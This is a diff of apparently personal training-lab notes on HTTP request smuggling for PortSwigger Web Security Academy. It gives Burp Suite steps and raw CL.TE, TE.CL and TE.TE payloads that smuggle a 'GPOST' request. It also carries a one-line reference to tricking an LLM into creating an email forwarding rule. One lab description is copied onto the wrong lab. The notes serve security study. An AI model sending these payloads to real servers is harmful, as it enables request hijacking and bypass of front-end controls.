@@ -3905,28 +3905,67 @@ LLM -> API: create_email_forwarding_rule('peter')
 
 ### HTTP request smuggling Lab
 **Burp suite no: lab supports HTTP/2, switch protocols in Burp Repeater from the Request attributes section of the Inspector panel**  
+- Downgrade HTTP protocol to HTTP/1.1
+  send repeater for GET / > under Burp Inspector pane > **Request attributes > select "HTTP/1" tab** > `GET / HTTP/2`
+- Disable automatic update of content-length > Burp setting > **uncheck "update Content-Length"**
+- Show non-printable characters > click the tab "\n" on repeater pane
 
 - HTTP request smuggling, basic CL.TE vulnerability
-  - Purpose: smuggle a request to the back-end server so that the next request processed by the back-end server appears to use the method GPOST
-  - Downgrade HTTP protocol to HTTP/1.1
-    send repeater for GET / > under Burp Inspector pane > **Request attributes > select "HTTP/1" tab** > `GET / HTTP/2`
-  - Change requeest method to POST  `POST /`
-  - Disable automatic update of content-length > Burp setting > **uncheck "update Content-Length"**
-  - show non-printable characters > click the tab "\n" on repeater pane
-  - Exploit 
+  - Info:  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method
+  - https://www.youtube.com/watch?v=4S5fkKJ4SM4
     ```
     POST / HTTP/1.1
     Host: 0a920089043f493082a106b80066006f.web-security-academy.net
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 6
-    Transfer-Encoding: chunked
-
-    0
-
+    Transfer-Encoding: chunked\r\n
+    \r\n
+    0\r\n
+    \r\n
     G
     ```
+    ![CL.TE vulnerabilities](img/CL.TE%20vulnerabilities.png)
  - second request throw response "Unrecognized method GPOST"
-- dd
+   - Info: This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method 
+   - https://www.youtube.com/watch?v=kIRIV-BwBTE
+     ```
+     POST / HTTP/1.1
+     Host: YOUR-LAB-ID.web-security-academy.net
+     Content-Type: application/x-www-form-urlencoded
+     Content-length: 4
+     Transfer-Encoding: chunked\r\n
+     \r\n
+     5c\r\n
+     GPOST / HTTP/1.1\r\n
+     Content-Type: application/x-www-form-urlencoded\r\n
+     Content-Length: 15\r\n
+     \r\n
+     x=1\r\n
+     0\r\n
+     \r\n
+     ```
+     ![TE.CL vulnerabilities](img/CL.TE%20vulnerabilities.png)
+- HTTP request smuggling, obfuscating the TE header
+  - Info: This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
+  - https://www.youtube.com/watch?v=TUsc14YH6LE
+    ```
+    POST / HTTP/1.1
+    Host: 0a6b001c04502e3b80f753da0015003a.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-length: 4\r\n
+    Transfer-Encoding: chunked\r\n
+    Transfer-encoding: cow\r\n
+    \r\n
+    5c\r\n
+    GPOST / HTTP/1.1\r\n
+    Content-Type: application/x-www-form-urlencoded\r\n
+    Content-Length: 15\r\n
+    \r\n
+    x=1\r\n
+    0\r\n
+    \r\n
+    ```
+     ![TE.TE vulnerabilities](img/TE.TE%20vulnerabilities.png)
 - dd
 - dd
 - dd
